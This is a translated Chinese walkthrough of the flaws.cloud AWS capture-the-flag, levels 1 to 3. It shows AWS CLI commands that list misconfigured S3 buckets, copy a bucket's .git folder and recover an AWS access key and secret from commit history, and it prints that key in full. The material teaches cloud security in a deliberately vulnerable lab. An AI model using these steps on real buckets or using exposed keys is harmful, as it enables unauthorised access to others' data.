# FLAWS challenge——AWS CTF通关记
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
最近在学习AWS（Amazon Web Services）的相关知识，发现了一个很有趣的AWS
CTF——[flaws](http://flaws.cloud/)。对于想了解AWS相关安全知识的小伙伴，FLAWS是一个不错的学习平台。我们可以通过一系列挑战，了解掌握AWS常见的错误和漏洞。这个CTF平台上，并不需要我们关注SQLi、XSS、Buffer
overflow等等这些为人熟知的漏洞，所需要关注的点集中在与AWS的特定问题上。
对于不了解AWS的小伙伴，可以查看[AWS官网](https://aws.amazon.com/)查看相关文档，或者查看[AWS的维基百科](https://en.wikipedia.org/wiki/Amazon_Web_Services)，了解相关基础知识。
在FLAWS的挑战网站首页 ，有这样一段话：
> **Scope** : Everything is run out of a single AWS account, and all
> challenges are sub-domains of [flaws.cloud](http://flaws.cloud/).
也就是说，这个平台的所有内容都运行在一个AWS账户中，并且所有的挑战都是`flaws.cloud`的子域。
FLAWS一共包括6个挑战，下面就开始我们的通关之旅吧 =）
## 0x01 Level 1
> This level is _buckets_ of fun. See if you can find the first sub-domain.
这里的提示中，可以打看到`buckets`这个关键词，对AWS有了解的小伙伴肯定知道，这里指的就`AWS S3
buckets`。由于S3存储桶能够托管静态网站，那么`flaws.cloud`很有可能就放在上面。
利用`nslookup`工具进行查询，可以看到IP地址为`52.218.218.194`：
利用`dig`工具进行反向查询，成功得到`flaws.cloud`的S3存储桶的地址`s3-website-us-west-2.amazonaws.com`：
_一个额外的小知识：对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，`flaws.cloud`加上它的S3地址： ，也能访问到主页。_
通过上述查询，我们知道`flaws.cloud`是一个在S3中的静态网站，地区位于`us-west-2`。如果使用一个自定义的域名（比如`flaws.cloud`）在S3中定义了一个静态站点，那它的`bucket
name`则必须与这个自定义域名一致。对于S3存储桶上HTTP端点的URL遵循固定格式：`s3-.amazonaws.com/`。基于这个准则，我们可以得出`flaws.cloud`的S3端点应该是 。
访问这个链接，返回一个XML，包含以下内容：
    This XML file does not appear to have any style information associated with it. The document tree is shown below.
    flaws.cloud
    1000
    false
    hint1.html
    2017-03-14T03:00:38.000Z
    "f32e6fbab70a118cf4e2dc03fd71c59d"
    2575
    STANDARD
    hint2.html
    2017-03-03T04:05:17.000Z
    "565f14ec1dce259789eb919ead471ab9"
    1707
    STANDARD
    hint3.html
    2017-03-03T04:05:11.000Z
    "ffe5dc34663f83aedaffa512bec04989"
    1101
    STANDARD
    index.html
    2018-07-10T16:47:16.000Z
    "ddd133aef0f381cf0440d5f09648791d"
    3082
    STANDARD
    logo.png
    2018-07-10T16:47:16.000Z
    "0623bdd28190d0583ef58379f94c2217"
    15979
    STANDARD
    robots.txt
    2017-02-27T01:59:28.000Z
    "9e6836f2de6d6e6691c78a1902bf9156"
    46
    STANDARD
    secret-dd02c7c.html
    2017-02-27T01:59:30.000Z
    "c5e83d744b4736664ac8375d4464ed4c"
    1051
    STANDARD
我们在页面中发现`secret-dd02c7c.html`在这个存储桶中：
访问 ，找到level
2的入口，成功通过level 1：
## 0x02 Level 2
> The next level is fairly similar, with a slight twist. You’re going to need
> your own AWS account for this.
这里第二关与第一关类似，可以想到仍然与S3有关，同时考虑到需要我们拥有自己的AWS账号，则可以联系到应该与S3存储桶的跨权限访问有关。
关于注册AWS免费账号，这里不过多阐述，可以查看这篇文章——[AWS入门 –
开通海外账户及巧用免费套餐](https://zhuanlan.zhihu.com/p/67478818)。由于我已经拥有自己的AWS账号，下面开始继续通关挑战。
首先通过账户的访问秘钥（AWSAccessKeyId、AWSSecretKey）配置AWS CLI：
      ~$ aws configure
      AWS Access Key ID :********************
      AWS Secret Access Key :********************:
      Default region name [ap-southeast-1]: us-west-2
      Default output format [None]:
通过level 2
的入口的URL：
，我们知道它的存储桶为`level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`
。这时尝试用自身账户配置好的AWS CLI 列出level 2 存储桶中包含的内容，发现`secret-e4443fc.html`：
    ~$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive
    2017-02-27 10:02:15      80751 everyone.png
    2017-03-03 11:47:17       1433 hint1.html
    2017-02-27 10:04:39       1035 hint2.html
    2017-02-27 10:02:14       2786 index.html
    2017-02-27 10:02:14         26 robots.txt
    2017-02-27 10:02:15       1051 secret-e4443fc.html
继续参照S3存储桶HTTP端点的URL规则`.amazonaws.com/`（这里的``对应level
2
的存储桶地址`level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`），访问这一秘密页面：  
成功通关level 2，找到level 3的入口。
## 0x03 Level 3
> The next level is fairly similar, with a slight twist. Time to find your
> first AWS key! I bet you’ll find something that will let you list what other
> buckets are.
这一关依然与前面类似，从S3的思路进行考虑，需要寻找AWS的key。
尝试访问level 3 的存储桶地址`http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud`，返回XML：
    This XML file does not appear to have any style information associated with it. The document tree is shown below.
    level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
    ...
用AWS CLI获取整个列表，发现`authenticated_users.png` 和一堆`.git` 目录。：
    ~$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive
    2017-09-17 23:12:24         52 .git/COMMIT_EDITMSG
    2017-09-17 23:12:24         23 .git/HEAD
    2017-09-17 23:12:24        130 .git/config
    2017-09-17 23:12:24         73 .git/description
    2017-09-17 23:12:24        452 .git/hooks/applypatch-msg.sample
    2017-09-17 23:12:24        896 .git/hooks/commit-msg.sample
    2017-09-17 23:12:24        189 .git/hooks/post-update.sample
    2017-09-17 23:12:24        398 .git/hooks/pre-applypatch.sample
    2017-09-17 23:12:24       1704 .git/hooks/pre-commit.sample
    2017-09-17 23:12:24       4898 .git/hooks/pre-rebase.sample
    2017-09-17 23:12:24       1239 .git/hooks/prepare-commit-msg.sample
    2017-09-17 23:12:24       3611 .git/hooks/update.sample
    2017-09-17 23:12:24        600 .git/index
    2017-09-17 23:12:24        240 .git/info/exclude
    2017-09-17 23:12:24        359 .git/logs/HEAD
    2017-09-17 23:12:24        359 .git/logs/refs/heads/master
    2017-09-17 23:12:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
    2017-09-17 23:12:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
    2017-09-17 23:12:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c
    2017-09-17 23:12:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
    2017-09-17 23:12:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c
    2017-09-17 23:12:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
    2017-09-17 23:12:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
    2017-09-17 23:12:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526
    2017-09-17 23:12:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
    2017-09-17 23:12:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
    2017-09-17 23:12:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a
    2017-09-17 23:12:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
    2017-09-17 23:12:25         41 .git/refs/heads/master
    2017-02-27 08:14:33     123637 authenticated_users.png
    2017-02-27 08:14:34       1552 hint1.html
    2017-02-27 08:14:34       1426 hint2.html
    2017-02-27 08:14:35       1247 hint3.html
    2017-02-27 08:14:33       1035 hint4.html
    2017-02-27 10:05:16       1703 index.html
    2017-02-27 08:14:33         26 robots.txt
查看`authenticated_users.png` 
，并没有获得有用的信息。
将level 3 存储桶上的内容复制一份：
    ~$ aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ~/testtest --recursive
通过浏览`.git`内部的文件内容， 在`.git/COMMIT_EDITMSG`中发现`Oops, accidentally added
something I shouldn't have`，看来上传了敏感的东西。
查看`git log`，发现敏感信息：
    ~testtest$ git log
    commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
    Author: 0xdabbad00 
    Date:   Sun Sep 17 09:10:43 2017 -0600
        Oops, accidentally added something I shouldn't have
    commit f52ec03b227ea6094b04e43f475fb0126edb5a61
    Author: 0xdabbad00 
    Date:   Sun Sep 17 09:10:07 2017 -0600
        first commit
可以看到，开发人员在提交`f52ec03b227ea609b04e43f475fb0126edb5a61`时有他不想要的东西，并在提交`b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526`时删除了它。
查看`f52ec03b227ea609b04e43f475fb0126edb5a61`这一提交：
    ~testtest$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
    Note: checking out 'f52ec03b227ea6094b04e43f475fb0126edb5a61'.
    You are in 'detached HEAD' state. You can look around, make experimental
    changes and commit them, and you can discard any commits you make in this
    state without impacting any branches by performing another checkout.
    If you want to create a new branch to retain commits you create, you may
    do so (now or later) by using -b with the checkout command again. Example:
      git checkout -b 
    HEAD is now at f52ec03 first commit
再次查看目录中包含的文件，发现`access_keys.txt`：
    ~/testtest$ ls
    access_keys.txt  authenticated_users.png  hint1.html  hint2.html  hint3.html
查看`access_keys.txt`的内容：
    ~/testtest$ cat access_keys.txt
    access_key AKIAJ366LIPB4IJKT7SA
    secret_access_key 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